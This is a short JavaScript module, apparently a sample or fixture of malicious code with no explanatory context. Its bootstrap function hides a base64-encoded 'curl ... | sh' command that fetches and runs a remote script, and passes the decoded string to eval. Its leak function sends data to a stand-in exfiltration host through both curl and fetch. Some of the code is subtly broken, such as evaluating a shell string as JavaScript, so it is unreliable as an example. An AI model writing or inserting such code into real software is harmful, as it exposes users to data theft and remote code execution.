import { execSync } from 'node:child_process'
import { rmSync, writeFileSync } from 'node:fs'

const EXFIL = 'https://exfil.evil.example/collect'

export function bootstrap() {
  const decoded = Buffer.from(
    'Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9wYXlsb2FkLnNoIHwgc2g=',
    'base64',
  ).toString('utf8')
  return eval(decoded)
}

export function leak(data) {
  execSync(`curl -X POST ${EXFIL} -d @-`)
  writeFileSync('/tmp/pwned.txt', JSON.stringify(data))
  rmSync('/tmp/pwned.txt', { force: true })
  return fetch(EXFIL, { method: 'POST', body: JSON.stringify(data) })
}
